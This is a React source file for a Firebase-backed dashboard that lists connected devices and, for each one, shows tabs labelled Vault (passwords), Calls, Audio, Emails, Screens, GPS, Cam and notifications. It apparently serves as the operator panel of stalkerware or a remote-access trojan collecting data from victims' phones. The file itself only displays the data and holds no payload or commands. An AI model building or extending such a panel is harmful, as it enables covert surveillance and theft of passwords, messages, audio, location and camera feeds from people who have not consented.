import React, { useState, useEffect } from 'react';
import { Layout } from './components/Layout';
import { DeviceSidebar } from './components/DeviceSidebar';
import { DashboardFeed } from './components/DashboardFeed';
import { useFirebaseLive } from './hooks/useFirebaseLive';
import { db } from './firebase/firebaseConfig';
import { ref, onValue, update } from 'firebase/database';
import { 
  CheckCircle2, 
  WifiOff, 
  Bell, 
  Globe, 
  Key, 
  Camera, 
  MapPin, 
  History, 
  Image as ImageIcon,
  Search,
  Phone,
  Mic,
  Edit2,
  Check,
  X,
  Mail
} from 'lucide-react';
import { SearchBar } from './components/SearchBar';
import clsx from 'clsx';

import { Login } from './components/Login';

function App() {
  const [devices, setDevices] = useState([]);
  const [selectedDeviceId, setSelectedDeviceId] = useState(null);
  const [isAuthenticated, setIsAuthenticated] = useState(sessionStorage.getItem('isAuth') === 'true');
  const [activeTab, setActiveTab] = useState('notifications');
  const [searchQuery, setSearchQuery] = useState('');
  const [isEditingName, setIsEditingName] = useState(false);
  const [tempName, setTempName] = useState('');

  const handleLogin = () => {
    setIsAuthenticated(true);
    sessionStorage.setItem('isAuth', 'true');
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem('isAuth');
  };

  const handleSaveName = async () => {
    if (!selectedDeviceId || !tempName.trim()) return;
    try {
      const deviceRef = ref(db, `devices/${selectedDeviceId}`);
      await update(deviceRef, { name: tempName });
      setIsEditingName(false);
    } catch (err) {
      console.error("Failed to update device name", err);
    }
  };

  // Fetch all devices for the sidebar
  useEffect(() => {
    if (!isAuthenticated) return;
    
    const devicesRef = ref(db, 'devices');
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const deviceList = Object.entries(data).map(([id, info]) => ({
          id,
          name: info.name || `Device ${id.slice(0, 4)}`,
          status: info.status || 'offline'
        }));
        setDevices(deviceList);
        if (!selectedDeviceId && deviceList.length > 0) {
          setSelectedDeviceId(deviceList[0].id);
        }
      } else {
        setDevices([]);
      }
    });
    return () => unsubscribe();
  }, [selectedDeviceId, isAuthenticated]);

  // Use custom hook to fetch live feed for selected device
  const { notifications, deviceStatus, error } = useFirebaseLive(selectedDeviceId);

  const selectedDevice = devices.find(d => d.id === selectedDeviceId);

  if (!isAuthenticated) {
    return <Login onLogin={handleLogin} />;
  }

  return (
    <Layout
      header={
        <div className="flex items-center w-full justify-between gap-6">
          {/* 1. Device Info (Left) */}
          <div className="flex items-center min-w-[240px]">
            {selectedDevice && (
              <div className="flex items-center gap-4">
                <div className={clsx(
                  "w-10 h-10 rounded-xl flex items-center justify-center transition-all duration-500 border", 
                  deviceStatus === 'online' ? "bg-emerald-500/10 border-emerald-500/50 text-emerald-500" : "bg-slate-900 border-slate-700 text-slate-500"
                )}>
                  {deviceStatus === 'online' ? <CheckCircle2 className="w-5 h-5" /> : <WifiOff className="w-5 h-5" />}
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-2">
                    {isEditingName ? (
                      <div className="flex items-center gap-1">
                        <input
                          type="text"
                          value={tempName}
                          onChange={(e) => setTempName(e.target.value)}
                          className="bg-slate-950 border border-emerald-500/50 text-white text-xs px-2 py-1 rounded outline-none w-32 font-mono"
                          autoFocus
                          onKeyDown={(e) => {
                            if (e.key === 'Enter') handleSaveName();
                            if (e.key === 'Escape') setIsEditingName(false);
                          }}
                        />
                        <button onClick={handleSaveName} className="p-1 hover:text-emerald-500 transition-colors">
                          <Check className="w-3.5 h-3.5" />
                        </button>
                        <button onClick={() => setIsEditingName(false)} className="p-1 hover:text-red-500 transition-colors">
                          <X className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ) : (
                      <div className="flex items-center gap-2 group">
                        <h2 className="text-sm font-bold text-white truncate">{selectedDevice.name}</h2>
                        <button 
                          onClick={() => {
                            setTempName(selectedDevice.name);
                            setIsEditingName(true);
                          }}
                          className="p-1 opacity-0 group-hover:opacity-100 transition-opacity hover:text-emerald-500"
                        >
                          <Edit2 className="w-3 h-3" />
                        </button>
                        {deviceStatus === 'online' && (
                          <span className="flex h-1.5 w-1.5 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]"></span>
                        )}
                      </div>
                    )}
                  </div>
                  <div className="flex items-center gap-2 text-[10px] font-mono uppercase tracking-widest text-slate-500">
                    <span className={clsx(deviceStatus === 'online' ? "text-emerald-500" : "text-slate-500")}>
                      {deviceStatus === 'online' ? 'Stream Active' : 'Offline'}
                    </span>
                    <span className="opacity-30">/</span>
                    <span className="truncate">UID: {selectedDeviceId?.slice(0, 8)}</span>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* 2. Tab Controls (Center) */}
          <div className="flex-1 flex justify-center">
            {selectedDevice && (
              <div className="flex items-center gap-1 bg-slate-900/50 p-1 rounded-xl border border-slate-800 backdrop-blur-md">
                {[
                  { id: 'notifications', label: 'Signals', icon: Bell },
                  { id: 'history', label: 'History', icon: History },
                  { id: 'passwords', label: 'Vault', icon: Key },
                  { id: 'call_logs', label: 'Calls', icon: Phone },
                  { id: 'audio', label: 'Audio', icon: Mic },
                  { id: 'emails', label: 'Emails', icon: Mail },
                  { id: 'screenshots', label: 'Screens', icon: ImageIcon },
                  { id: 'location', label: 'GPS', icon: MapPin },
                  { id: 'camera', label: 'Cam', icon: Camera },
                ].map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={clsx(
                      "flex items-center gap-2 px-3 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all duration-300",
                      activeTab === tab.id 
                        ? "bg-emerald-500 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)]" 
                        : "text-slate-500 hover:text-slate-300 hover:bg-white/5"
                    )}
                    title={tab.label}
                  >
                    <tab.icon className="w-3.5 h-3.5" />
                    <span className="hidden xl:inline">{tab.label}</span>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* 3. Search Bar (Right) */}
          <div className="min-w-[300px] flex justify-end">
            {selectedDevice && (
              <div className="hidden lg:block w-full">
                <SearchBar searchQuery={searchQuery} setSearchQuery={setSearchQuery} />
              </div>
            )}
          </div>
        </div>
      }
      sidebar={
        <DeviceSidebar 
          devices={devices} 
          selectedDeviceId={selectedDeviceId} 
          onSelectDevice={setSelectedDeviceId} 
          onLogout={handleLogout}
        />
      }
    >
      <DashboardFeed 
        deviceId={selectedDeviceId}
        deviceName={selectedDevice?.name}
        deviceStatus={deviceStatus}
        notifications={notifications}
        error={error}
        activeTab={activeTab}
        searchQuery={searchQuery}
        setActiveTab={setActiveTab}
        setSearchQuery={setSearchQuery}
      />
    </Layout>
  );
};

export default App;
